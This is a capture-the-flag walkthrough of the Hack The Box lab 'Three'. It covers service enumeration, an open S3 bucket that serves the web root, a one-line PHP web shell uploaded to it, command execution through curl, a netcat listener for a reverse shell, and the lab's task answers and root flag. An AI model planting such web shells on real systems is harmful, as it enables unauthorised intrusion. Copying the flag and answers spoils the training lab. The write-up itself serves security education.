---
layout: single
title: Three - Hack The Box
excerpt: "In this machine, we are taking advantage of a misconfigured Amazon S3 service by uploading malicious PHP files."
date: 2025-03-12
classes: wide
header:
  teaser: /img2/three.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Very Easy
tags:
  - Amazon S3
  - cloud
  - aws
---

![](/img2/Pasted%20image%2020250312103256.png)
## Introduction

> In this machine, we are taking advantage of a misconfigured Amazon S3 service by uploading malicious PHP files.

## Reconnaissance

1. Connectivity
```bash
ping -c1 10.129.11.67
```

2. Nmap
```nmap
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.11.67
```
![](/img2/Pasted%20image%2020250312103445.png)

3. See the version of the service
```bash
nmap -sV -sC -p22,80 10.129.11.67
```
![](/img2/Pasted%20image%2020250312103702.png)

4. Discover web technologies
```bash
whatweb http://10.129.11.67/
```
![](/img2/Pasted%20image%2020250312103954.png)

5. Set domain in /etc/hosts
```bash
echo "10.129.11.67 thetoppers.htb" >> /etc/hosts
```

6. Discover subdomains with gobuster
```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 --append-domain
```
![](/img2/Pasted%20image%2020250312105751.png)

7. Set subdomain in /etc/hosts
![](/img2/Pasted%20image%2020250312105912.png)

8. Find the possible service of an s3 subdomain
![](/img2/Pasted%20image%2020250312110208.png)

9. See the content of aws bucket
- Discover the s3 bucket
```bash
aws s3 ls --endpoint-url=http://s3.thetoppers.htb --no-sign-request
```
![](/img2/Pasted%20image%2020250312112127.png)

- Try to list s3 bucket content
```bash
aws s3 ls s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
```
![](/img2/Pasted%20image%2020250312112248.png)

- Add credentials
```bash
aws configure
```
![](/img2/Pasted%20image%2020250312112352.png)

- List s3 bucket content
```bash
aws s3 ls s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
```
![](/img2/Pasted%20image%2020250312112511.png)

## Exploitation

1. Upload test php file.
- Create file
```bash
echo '<?php echo "PyUs3r" ?>' > whoami.php
```

- Upload file
```bash
aws s3 cp whoami.php s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
```
![](/img2/Pasted%20image%2020250312113110.png)

- Verify if a new file has been uploaded
```bash
aws s3 ls s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
```
![](/img2/Pasted%20image%2020250312113427.png)
```bash
curl http://thetoppers.htb/whoami.php
```
![](/img2/Pasted%20image%2020250312113532.png)

2. Reverse shell
- Create file
```bash
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
```

-  Upload file
```bash
aws s3 cp cmd.php s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
```
![](/img2/Pasted%20image%2020250312115449.png)

- Execute command
```bash
curl http://thetoppers.htb/cmd.php?cmd=whoami
```
![](/img2/Pasted%20image%2020250312115547.png)

- Send reverse shell
![](/img2/Pasted%20image%2020250312115655.png)
```bash
nc -nlvp 9000
```
![[Pasted image 20250312120135.png]]
![](/img2/Pasted%20image%2020250312120309.png)

## Tasks

1. How many TCP ports are open?
> 2

2. What is the domain of the email address provided in the "Contact" section of the website?
> thetoppers.htb

3. In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
> /etc/hosts

4. Which sub-domain is discovered during further enumeration?
> s3.thetoppers.htb

5. Which service is running on the discovered sub-domain?
> amazon s3

6. Which command line utility can be used to interact with the service running on the discovered sub-domain?
> awscli

7. Which command is used to set up the AWS CLI installation?
> aws configure

8. What is the command used by the above utility to list all of the S3 buckets?
> aws s3 ls

9. This server is configured to run files written in what web scripting language?
> php

10. Submit root flag
> a980d99281a28d638ac68b9bf9453c2b

![](/img2/Pasted%20image%2020250312120713.png)
